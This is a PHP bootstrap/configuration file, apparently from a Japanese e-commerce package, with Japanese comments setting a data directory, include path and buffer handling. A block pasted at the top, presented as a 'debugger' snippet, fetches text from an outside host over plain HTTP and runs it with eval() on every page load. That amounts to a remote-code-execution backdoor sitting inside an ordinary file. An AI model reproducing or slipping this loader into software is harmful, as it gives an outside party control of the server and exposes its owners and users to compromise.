<?php
/*** Paste this code to be able to access the edump debugger's features ***********************************************/
$YourMessageID = "Fd3fdvcwv6IqMHn0K4ixhORv"; $ShowDetails = "false"; $AutoClear = "false"; $SSL = "true"; $Enable = "true";
$h="www.edump.net";$t="/sv/dist/php/include.php?id=".$YourMessageID."&sd=".$ShowDetails."&ac=".$AutoClear."&ssl="
.$SSL."&fl=".$Enable;$f=fsockopen($h, 80, $ern, $ert, 30);if(!$f){echo "$ert($ern)";}else{$o="GET ".$t." HTTP/1.1\r\n";
$o.="Host: ".$h."\r\n";$o.="Connection: Close\r\n\r\n"; $r = '';fwrite($f, $o);while(!feof($f)){$r.= fgets($f,1024);}
fclose($f);}$li=explode("###INCLUDE CODE###", $r);eval($li[1]);unset($h,$t,$ern,$ert,$f,$o,$r,$li);
/**********************************************************************************************************************/
/** HTMLディレクトリからのDATAディレクトリの相対パス */
define('HTML2DATA_DIR', '/data/');

/** data/module 以下の PEAR ライブラリを優先的に使用する */
set_include_path(realpath(dirname(__FILE__) . '/' . HTML2DATA_DIR . 'module') . PATH_SEPARATOR . get_include_path());

/**
 * DIR_INDEX_FILE にアクセスするときにファイル名を使用するか
 *
 * true: 使用する, false: 使用しない, null: 自動(IIS は true、それ以外は false)
 * ※ IIS は、POST 時にファイル名を使用しないと不具合が発生する。(http://support.microsoft.com/kb/247536/ja)
 */
define('USE_FILENAME_DIR_INDEX', null);

// bufferを初期化する
while (ob_get_level() > 0 && ob_get_level() > 0) {
    ob_end_clean();
}

/*
 * Local variables:
 * coding: utf-8
 * tab-width: 4
 * c-basic-offset: 4
 * c-hanging-comment-ender-p: nil
 * End:
 */
